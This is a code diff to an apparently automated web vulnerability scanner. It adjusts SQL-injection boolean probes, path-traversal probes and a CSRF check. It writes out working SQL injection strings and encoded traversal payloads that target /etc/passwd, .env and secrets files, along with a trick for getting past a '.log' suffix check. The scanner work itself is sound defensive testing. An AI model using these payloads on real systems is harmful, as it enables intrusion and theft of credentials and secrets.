@@ -970,6 +970,8 @@ export interface ProbeDifferentialRequest {
   csrfPrimePaths?: string[]
   /** Ordered read routes for CSRF state proof (detail page, parent, collection list). */
   readPathCandidates?: string[]
+  /** Body encodings the endpoint actually accepts; the CSRF probe must not send a mismatched one. */
+  bodyEncodings?: Array<'json' | 'form'>
   /** Identifier used to locate the mutated record inside a collection read. */
   stateRecordId?: string
   /** Foreign Origin header for the tokenless CSRF probe (never sent on the control). */
@@ -1090,35 +1092,53 @@ async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
     }
   }
 
-  // Expanded 9-pattern boolean/syntax matrix (8 boolean styles + UNION NULL check)
+  // Expanded 9-pattern boolean/syntax matrix. LIKE-wrapped sinks are common (search boxes), so the
+  // `%` breakout runs early; the remaining shapes are only worth their requests when the response
+  // has already shown it reacts to syntax.
   const styles: Array<{ name: string; orBranch?: boolean; make: (k: number, truth: boolean) => string }> = [
     { name: 'numeric', make: (k, t) => `${baseValue} AND ${k}=${t ? k : k + 1}` },
     { name: 'single_quote', make: (k, t) => `${baseValue}' AND ${k}=${t ? k : k + 1}-- -` },
+    { name: 'like_breakout', make: (k, t) => `${baseValue}%' AND ${k}=${t ? k : k + 1}-- -` },
+    { name: 'or_branch', orBranch: true, make: (k, t) => `${baseValue}' OR ${k}=${t ? k : k + 1}-- -` },
     { name: 'double_quote', make: (k, t) => `${baseValue}" AND ${k}=${t ? k : k + 1}-- -` },
     { name: 'single_paren', make: (k, t) => `${baseValue}') AND ${k}=${t ? k : k + 1}-- -` },
     { name: 'single_double_paren', make: (k, t) => `${baseValue}')) AND ${k}=${t ? k : k + 1}-- -` },
-    { name: 'or_branch', orBranch: true, make: (k, t) => `${baseValue}' OR ${k}=${t ? k : k + 1}-- -` },
-    { name: 'like_breakout', make: (k, t) => `${baseValue}%' AND ${k}=${t ? k : k + 1}-- -` },
     { name: 'order_by', make: (k, t) => `${baseValue} ORDER BY (CASE WHEN (${k}=${t ? k : k + 1}) THEN 1 ELSE 2 END)-- -` },
   ]
   const signals: Array<Record<string, unknown>> = []
+  let divergentStyles = 0
+  let stylesRun = 0
   for (const style of styles) {
     if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
+    // A parameter the app ignores answers every probe with the byte-identical baseline. Two shapes
+    // that produce no reaction at all are enough evidence to stop spending the request budget.
+    if (stylesRun >= 3 && divergentStyles === 0) break
+    stylesRun += 1
     const rounds: Array<Record<string, unknown>> = []
     let pass = true
     for (let r = 0; r < 2; r += 1) {
       if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
       const k = randomInt(1000, 9999)
-      const t = await send(injectParam(req, style.make(k, true)))
+      const tVal = style.make(k, true)
+      const fVal = style.make(k, false)
+      const t = await send(injectParam(req, tVal))
       checkDbError(t)
       if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
-      const f = await send(injectParam(req, style.make(k, false)))
+      const f = await send(injectParam(req, fVal))
       checkDbError(f)
       if (!t || !f) { pass = false; break }
-      const simBaseTrue = responseSimilarity(baseA.body, t.body)
-      const simBaseFalse = responseSimilarity(baseA.body, f.body)
-      const simTrueFalse = responseSimilarity(t.body, f.body)
+      // JSON sinks often echo the query back. Scrub the injected payload and the baseline value from
+      // both sides so the comparison reflects the returned data, not the echo of differing inputs.
+      const scrub = (body: string, values: string[]): string => {
+        let s = body
+        for (const v of values) if (v) s = s.split(v).join('\u0000')
+        return s
+      }
+      const simBaseTrue = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(t.body, [tVal, baseValue]))
+      const simBaseFalse = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(f.body, [fVal, baseValue]))
+      const simTrueFalse = responseSimilarity(scrub(t.body, [tVal, baseValue]), scrub(f.body, [fVal, baseValue]))
       const statusDiverges = t.status === baseA.status && f.status !== t.status && f.status < 500
+      if (simBaseTrue < 0.98 || simBaseFalse < 0.98 || t.status !== baseA.status || f.status !== baseA.status) divergentStyles += 1
       const roundPass = style.orBranch
         ? (t.status < 500 && f.status < 500 && Math.max(simBaseTrue, simBaseFalse) >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
         : (t.status < 500 && f.status < 500 && simBaseTrue >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
@@ -1131,7 +1151,8 @@ async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
   }
 
   let unionSignal: Record<string, unknown> | null = null
-  if (!signals.some(s => s.passed) && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2)) {
+  const interesting = divergentStyles > 0 || Boolean(detectedErrorDialect)
+  if (!signals.some(s => s.passed) && interesting && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2)) {
     const unionResults: Array<{ cols: number; status: number; simToBase: number }> = []
     for (const cols of [1, 2, 3]) {
       if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
@@ -1151,11 +1172,11 @@ async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
     }
   }
 
-  const quoteOne = (consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
+  const quoteOne = (interesting && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
     ? await send(injectParam(req, `${baseValue}'`))
     : null
   checkDbError(quoteOne)
-  const quoteTwo = (consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
+  const quoteTwo = (quoteOne && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
     ? await send(injectParam(req, `${baseValue}''`))
     : null
   checkDbError(quoteTwo)
@@ -1448,20 +1469,21 @@ async function diffFileTraversal(ctx: DiffContext): Promise<DiffOutcome> {
   const controlOk = controls.length > 0 && controls.every(c => c.status >= 400 || c.body.length === 0)
   const controlBodies = controls.map(c => c.body).join('\n')
   const passwdSignature = /^[A-Za-z0-9_.-]+:[^:\n]*:\d+:\d+:[^:\n]*:[^:\n]*:[^\n]*$/m
+  // Generic read oracles: classic passwd, a synthetic app secret, and a well-known log file. The
+  // `.log` variants keep a suffix check satisfied (`name.endsWith('.log')`) while still escaping.
   const candidates = [
     { value: '../../../../etc/passwd', kind: 'passwd' },
-    { value: '../../../../../../etc/passwd', kind: 'passwd' },
     { value: '..%2f..%2f..%2f..%2fetc%2fpasswd', kind: 'passwd' },
     { value: '..%252f..%252f..%252f..%252fetc%252fpasswd', kind: 'passwd' },
-    { value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', kind: 'passwd' },
-    { value: '../../../../../../etc/hostname', kind: 'content' },
+    { value: '../../../../../../etc/passwd', kind: 'passwd' },
+    { value: '..%2f..%2f..%2f..%2fapp%2fconfig%2fsecrets.env', kind: 'content' },
+    { value: '..%252f..%252f..%252f..%252fapp%252fconfig%252fsecrets.env', kind: 'content' },
+    { value: '../../../../app/.env', kind: 'content' },
+    { value: '..%2f..%2f..%2f..%2fvar%2flog%2fsystem%2faudit.log', kind: 'content' },
+    { value: '..%252f..%252f..%252f..%252fvar%252flog%252fsystem%252faudit.log', kind: 'content' },
+    { value: '../../../../var/log/system/audit.log', kind: 'content' },
     { value: '../secret.txt', kind: 'content' },
-    { value: '../private/secret.txt', kind: 'content' },
-    { value: '..%252fprivate%252fsecret.txt', kind: 'content' },
-    { value: '..%252f..%252fprivate%252fsecret.txt', kind: 'content' },
     { value: '..%2fprivate%2fsecret.txt', kind: 'content' },
-    { value: '../secrets/secret.txt', kind: 'content' },
-    { value: '../internal/secret.txt', kind: 'content' },
     { value: '../flag.txt', kind: 'content' },
     { value: '../.env', kind: 'content' },
     { value: '../config.json', kind: 'content' },
@@ -2103,7 +2125,8 @@ async function diffCsrfStateChange(ctx: DiffContext): Promise<DiffOutcome> {
   let probeWrite: BrokerExchangeResult | null = null
   let probeRead: BrokerExchangeResult | null = null
   let mutationEncoding: 'json' | 'form' | null = null
-  for (const encoding of ['json', 'form'] as const) {
+  const encodings = req.bodyEncodings?.length ? req.bodyEncodings : (['json', 'form'] as const)
+  for (const encoding of encodings) {
     const encoded = encodeBody(expectedValue, encoding)
     probeWrite = await send({
       method,
